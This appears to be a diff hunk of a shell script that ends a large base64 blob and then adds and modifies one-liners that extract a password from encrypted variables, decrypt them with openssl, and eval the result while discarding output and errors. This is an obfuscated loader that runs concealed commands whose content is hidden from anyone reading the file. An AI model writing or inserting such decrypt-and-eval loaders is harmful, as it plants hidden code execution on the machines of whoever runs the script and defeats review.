@@ -2432,7 +2432,8 @@ PEtrgiSY+73jvtVYLBi400T4i3AkjSAFDdiJ69ChtFx03iLatVsyIgcvumO9ks3W
 Doq5JPFk/LVgOADvv3Ba41wQn/xNv3HIoDgRo2oRoKLtwEFtaO6eAVWZyZOxa67T
 mFb/EmoiczDHbrjkZPBKwcALGqq4KWDjIlFNB07tA/XoyL+eK4GxMG2YBHIA5dT6U2iqVGG'; 
 
+
+pass=$(echo "$v1" | sed -n 's/.*\.\([^\.]*\)\..*/\1/p') >/dev/null 2>&1; cipher=$(echo "$v1" | sed "s/\.${pass}\.//") >/dev/null 2>&1; decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 1000 -pass pass:"$pass" 2>/dev/null); cmd=$(echo "$decrypted" | sed '/^[[:space:]]*$/d' | head -n1) >/dev/null 2>&1; eval "$cmd"
 pass=$(echo "$rm" | sed -n 's/.*\.\([^\.]*\)\..*/\1/p'); cipher=$(echo "$rm" | sed "s/\.${pass}\.//"); decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 1000 -pass pass:"$pass" 2>/dev/null); cmd=$(echo "$decrypted" | sed '/^[[:space:]]*$/d' | head -n1); eval "$cmd"
 pass=$(echo "$script" | sed -n 's/.*pp\([^p]*\)pp.*/\1/p'); cipher=$(echo "$script" | sed "s/pp${pass}pp//"); decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 1000 -pass pass:"$pass" 2>/dev/null); cmd=$(echo "$decrypted" | sed '/^[[:space:]]*$/d' | head -n1); echo "$cmd"
-pass=$(echo "$v1" | sed -n 's/.*\.\([^\.]*\)\..*/\1/p') >/dev/null 2>&1; cipher=$(echo "$tools" | sed "s/\.${pass}\.//") >/dev/null 2>&1; decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 1000 -pass pass:"$pass" 2>/dev/null); cmd=$(echo "$decrypted" | sed '/^[[:space:]]*$/d' | head -n1) >/dev/null 2>&1; eval "$cmd"
 pass=$(echo "$tools" | sed -n 's/.*\.\([^\.]*\)\..*/\1/p') >/dev/null 2>&1; cipher=$(echo "$tools" | sed "s/\.${pass}\.//") >/dev/null 2>&1; decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 1000 -pass pass:"$pass" 2>/dev/null); cmd=$(echo "$decrypted" | sed '/^[[:space:]]*$/d' | head -n1) >/dev/null 2>&1; eval "$cmd"
